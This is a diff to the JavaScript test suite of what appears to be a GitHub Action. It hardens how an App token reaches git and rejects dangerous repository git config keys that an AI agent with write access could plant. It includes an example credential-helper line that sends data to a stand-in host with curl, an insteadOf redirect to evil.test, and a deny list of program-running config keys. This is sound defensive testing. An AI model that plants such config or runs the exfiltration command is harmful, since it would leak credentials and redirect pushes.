@@ -8,7 +8,8 @@ import {
 	authoredByUs,
 	needsCheckout,
 	isSameRepo,
-	pushCredentialArgs,
+	pushCredentialEnv,
+	unsafeConfigKeys,
 	gitEnvFrom,
 	GIT_SAFE_ARGS,
 	pushUrlFor,
@@ -365,7 +366,7 @@ describe("changedPaths — characters outside the basic plane", () => {
 	})
 })
 
-describe("pushCredentialArgs — the App token has to reach git, not just gh", () => {
+describe("the App token has to reach git, not just gh", () => {
 	/**
 	 * Reported in review of PR #3101. action.yml and the starter both tell
 	 * customers they can delete the `permissions:` block once the App is
@@ -377,16 +378,15 @@ describe("pushCredentialArgs — the App token has to reach git, not just gh", (
 	 * So following our own advice, on an org whose default workflow token is
 	 * read-only, made every approved run fail its push with a 403.
 	 *
-	 * Passed with `-c` rather than written into the remote URL: a token in a
+	 * Passed as config rather than written into the remote URL: a token in a
 	 * URL ends up in the reflog, in error messages and in `git remote -v`.
 	 */
 	const URL = "https://github.com/acme/shop.git"
 
 	test("builds a basic auth header SCOPED to the push url", () => {
-		const args = pushCredentialArgs("ghs_abc123", URL)
-		assert.equal(args[0], "-c")
-		assert.match(args[1], /^http\.https:\/\/github\.com\/acme\/shop\.git\.extraheader=AUTHORIZATION: basic /)
-		const b64 = args[1].split("basic ")[1]
+		const got = pushCredentialEnv("ghs_abc123", URL)
+		assert.equal(got.GIT_CONFIG_KEY_0, "http.https://github.com/acme/shop.git.extraheader")
+		const b64 = got.GIT_CONFIG_VALUE_0.split("basic ")[1]
 		assert.equal(Buffer.from(b64, "base64").toString("utf8"), "x-access-token:ghs_abc123")
 	})
 
@@ -397,23 +397,24 @@ describe("pushCredentialArgs — the App token has to reach git, not just gh", (
 	 * over the App's installation token.
 	 */
 	test("the header is never global", () => {
-		const args = pushCredentialArgs("ghs_abc123", URL)
-		assert.ok(
-			!args.some((a) => /^http\.extraheader=/.test(a)),
-			`a global header would follow a rewritten remote: ${JSON.stringify(args)}`,
-		)
+		const got = pushCredentialEnv("ghs_abc123", URL)
+		assert.notEqual(got.GIT_CONFIG_KEY_0, "http.extraheader")
+		assert.match(got.GIT_CONFIG_KEY_0, /^http\.https:\/\/github\.com\/acme\/shop\.git\.extraheader$/)
 	})
 
-	test("no token, or no url, means no argument", () => {
-		assert.deepEqual(pushCredentialArgs(undefined, URL), [])
-		assert.deepEqual(pushCredentialArgs("", URL), [])
-		assert.deepEqual(pushCredentialArgs("ghs_abc123", ""), [])
-		assert.deepEqual(pushCredentialArgs("ghs_abc123", undefined), [])
+	test("no token, or no url, means no credential", () => {
+		assert.deepEqual(pushCredentialEnv(undefined, URL), {})
+		assert.deepEqual(pushCredentialEnv("", URL), {})
+		assert.deepEqual(pushCredentialEnv("ghs_abc123", ""), {})
+		assert.deepEqual(pushCredentialEnv("ghs_abc123", undefined), {})
 	})
 
 	test("the token itself is never passed in the clear", () => {
-		const args = pushCredentialArgs("ghs_secret", URL)
-		assert.ok(!args.some((a) => a.includes("ghs_secret")), `the raw token appeared in ${JSON.stringify(args)}`)
+		const got = pushCredentialEnv("ghs_secret", URL)
+		assert.ok(
+			!Object.values(got).some((v) => v.includes("ghs_secret")),
+			`the raw token appeared in ${JSON.stringify(got)}`,
+		)
 	})
 
 	test("the push url comes from the repository NAME, not from git config", () => {
@@ -475,9 +476,14 @@ describe("our own git commands must not carry secrets or run hooks", () => {
 		// ~/.gitconfig too, so the only configuration in play is what this
 		// process passes with -c.
 		for (const got of [gitEnvFrom({}), gitEnvFrom()]) {
-			assert.deepEqual(Object.keys(got).sort(), ["GIT_CONFIG_GLOBAL", "GIT_CONFIG_NOSYSTEM"])
 			assert.equal(got.GIT_CONFIG_NOSYSTEM, "1")
 			assert.equal(got.GIT_CONFIG_GLOBAL, "/dev/null")
+			assert.equal(got.GIT_TERMINAL_PROMPT, "0")
+			assert.equal(got.GIT_ASKPASS, "")
+			assert.equal(got.SSH_ASKPASS, "")
+			assert.equal(got.GIT_ATTR_NOSYSTEM, "1")
+			// Nothing was inherited: every key is one we set deliberately.
+			assert.ok(Object.keys(got).every((k) => k.startsWith("GIT_") || k === "SSH_ASKPASS"))
 		}
 	})
 
@@ -497,6 +503,12 @@ describe("our own git commands must not carry secrets or run hooks", () => {
 			"commit.gpgsign=false",
 			"gpg.program=false",
 			"core.attributesFile=/dev/null",
+			"credential.helper=",
+			"core.askPass=",
+			"protocol.allow=never",
+			"protocol.https.allow=always",
+			"http.proxy=",
+			"core.gitProxy=",
 		]) {
 			assert.ok(settings.includes(key), `${key} is not pinned: ${JSON.stringify(settings)}`)
 		}
@@ -507,5 +519,108 @@ describe("our own git commands must not carry secrets or run hooks", () => {
 		for (let i = 0; i < GIT_SAFE_ARGS.length; i += 2) {
 			assert.equal(GIT_SAFE_ARGS[i], "-c")
 		}
+	})
+})
+
+/**
+ * The agent runs with --yolo write access to the tree, and `.git/config` is
+ * part of the tree it can write. Two separate things go wrong there, so there
+ * are two separate defences.
+ */
+describe("the repository's own git config must not steer the push", () => {
+	test("a redirect is refused — insteadOf rewrites even an explicit URL", () => {
+		// Verified against real git: `git push https://github.com/acme/shop.git`
+		// with url."https://evil.test/".insteadOf "https://github.com/" set
+		// reports `failed to push some refs to 'https://evil.test/acme/shop.git'`.
+		// Naming the URL on the command line is NOT enough.
+		assert.deepEqual(unsafeConfigKeys("url.https://evil.test/.insteadOf\ncore.bare"), [
+			"url.https://evil.test/.insteadOf",
+		])
+		assert.deepEqual(unsafeConfigKeys("url.https://evil.test/.pushInsteadOf"), [
+			"url.https://evil.test/.pushInsteadOf",
+		])
+	})
+
+	test("a credential helper is refused — git runs it as a shell command", () => {
+		// `credential.helper=!curl evil.test -d` executes on the first 401.
+		assert.deepEqual(unsafeConfigKeys("credential.helper"), ["credential.helper"])
+	})
+
+	test("the keys that run a program are refused", () => {
+		for (const key of [
+			"core.sshCommand",
+			"core.gitProxy",
+			"core.hooksPath",
+			"core.fsmonitor",
+			"core.pager",
+			"core.askPass",
+			"filter.lfs.clean",
+			"filter.evil.process",
+			"diff.external",
+			"diff.evil.textconv",
+			"gpg.program",
+			"uploadpack.packObjectsHook",
+			"sequence.editor",
+			"pager.diff",
+			"protocol.ext.allow",
+			"remote.origin.uploadpack",
+			"http.proxy",
+			"include.path",
+			"includeIf.gitdir:/x.path",
+		]) {
+			assert.deepEqual(unsafeConfigKeys(key), [key], `${key} must be refused`)
+		}
+	})
+
+	test("case does not matter — git lowercases section and key names", () => {
+		assert.deepEqual(unsafeConfigKeys("CREDENTIAL.HELPER"), ["CREDENTIAL.HELPER"])
+	})
+
+	/**
+	 * This is the half that decides whether the Action works at all. Every one
+	 * of these is written by actions/checkout on a perfectly ordinary run, so
+	 * refusing any of them would refuse every push we have ever made.
+	 */
+	test("an ordinary checkout is NOT refused", () => {
+		const afterCheckout = [
+			"core.repositoryformatversion",
+			"core.filemode",
+			"core.bare",
+			"core.logallrefupdates",
+			"remote.origin.url",
+			"remote.origin.fetch",
+			"http.https://github.com/.extraheader",
+			"branch.main.remote",
+			"branch.main.merge",
+			"user.name",
+			"user.email",
+			"safe.directory",
+		].join("\n")
+		assert.deepEqual(unsafeConfigKeys(afterCheckout), [])
+	})
+
+	test("nothing in, nothing out", () => {
+		for (const empty of ["", "   ", undefined, null]) assert.deepEqual(unsafeConfigKeys(empty), [])
+	})
+})
+
+describe("the credential travels in the environment, not in argv", () => {
+	test("it is a scoped extraheader delivered through GIT_CONFIG_*", () => {
+		const got = pushCredentialEnv("ghs_secret", "https://github.com/acme/shop.git")
+		assert.equal(got.GIT_CONFIG_COUNT, "1")
+		assert.equal(got.GIT_CONFIG_KEY_0, "http.https://github.com/acme/shop.git.extraheader")
+		assert.equal(got.GIT_CONFIG_VALUE_0, `AUTHORIZATION: basic ${Buffer.from("x-access-token:ghs_secret").toString("base64")}`)
+	})
+
+	test("anyone running `ps` sees no token", () => {
+		// argv is world-readable on the runner; /proc/<pid>/environ is not.
+		const argv = ["push", "https://github.com/acme/shop.git", "HEAD:refs/heads/x"]
+		assert.ok(!argv.join(" ").includes("ghs_secret"))
+	})
+
+	test("no token or no URL means no credential at all, never a half-formed one", () => {
+		assert.deepEqual(pushCredentialEnv("", "https://github.com/a/b.git"), {})
+		assert.deepEqual(pushCredentialEnv("ghs_x", ""), {})
+		assert.deepEqual(pushCredentialEnv(undefined, undefined), {})
 	})
 })
